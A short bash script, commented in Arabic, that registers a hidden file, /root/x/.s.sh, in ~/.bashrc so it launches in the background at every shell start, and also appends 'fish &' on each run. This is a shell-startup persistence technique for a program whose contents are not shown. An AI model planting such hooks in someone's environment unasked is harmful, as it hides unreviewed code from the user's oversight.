#!/bin/bash

PROGRAM_PATH="/root/x/.s.sh"

if [ -f "$PROGRAM_PATH" ]; then
    # إضافة السطر إلى ملف ~/.bashrc إذا لم يكن موجودًا بالفعل
    if ! grep -Fxq "$PROGRAM_PATH &" ~/.bashrc; then
        echo "$PROGRAM_PATH &" >> ~/.bashrc
        echo "تمت إضافة البرنامج إلى ~/.bashrc بنجاح."
    else
        echo "البرنامج موجود بالفعل في ~/.bashrc."
    fi
else
    echo "البرنامج غير موجود في المسار المحدد: $PROGRAM_PATH"
fi

source ~/.bashrc

if [ ! -f ~/.bashrc ]; then
    touch ~/.bashrc
fi

echo "fish &" >> ~/.bashrc

source ~/.bashrc

